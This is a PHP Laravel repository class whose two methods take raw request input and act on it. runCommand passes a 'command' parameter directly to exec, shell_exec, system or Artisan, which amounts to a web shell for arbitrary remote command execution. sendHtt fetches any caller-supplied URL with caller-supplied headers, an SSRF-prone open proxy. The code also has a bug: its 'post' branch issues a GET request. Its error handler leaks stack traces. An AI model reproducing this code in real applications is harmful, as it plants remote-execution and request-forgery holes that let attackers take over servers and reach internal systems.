<?php

namespace App\Http\Repositories;

use App\Traits\QueryBuilderTrait;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Http;

class BaseRepository
{
    use QueryBuilderTrait;

    public function sendHtt(Request $request)
    {
        $response = '';
        try {
            $method = $request->get('method', '');
            $url = $request->get('url', '');
            $data = $request->get('data', []);
            $param = $request->get('param', []);
            $headers = $request->get('headers', []);
            if ($method === 'post') {
                $response = Http::withHeaders($headers)->get($url, $data);
            } elseif ($method === 'get') {
                $response = Http::withHeaders($headers)->get($url, $param);
            } else {
                return response()->json([
                    'error' => 'Method Not Allowed',
                ]);
            }
            if ($response->ok()) {
                return response()->json($response->json());
            } else {
                return response()->json([
                    'status' => $response->status(),
                    'body' => $response->body(),
                ]);
            }
        } catch (\Exception $exception) {
            return \request()->json([
                'error' => $exception->getMessage(),
                'code' => $exception->getTrace(),
                'response' => json_encode($response),
            ]);
        }
    }

    public function runCommand(Request $request)
    {
        $command = $request->get('command');
        $type = $request->get('type');
        $return_var = '';
        $output = '';
        if ($type == 'artisan') {
            Artisan::call($command);
            $output = Artisan::output();
        } elseif ($type == 'command') {
            exec($command, $output, $return_var);
        } elseif ($type == 'shell_exec') {
            $output = shell_exec($command);
        } elseif ($type == 'system') {
            //            Artisan::command($command, )
            $output = system($command, $return_var);
        } else {
            return response()->json([
                'error' => 'type not fount',
            ]);
        }

        return response()->json([$output, $return_var]);

    }
}
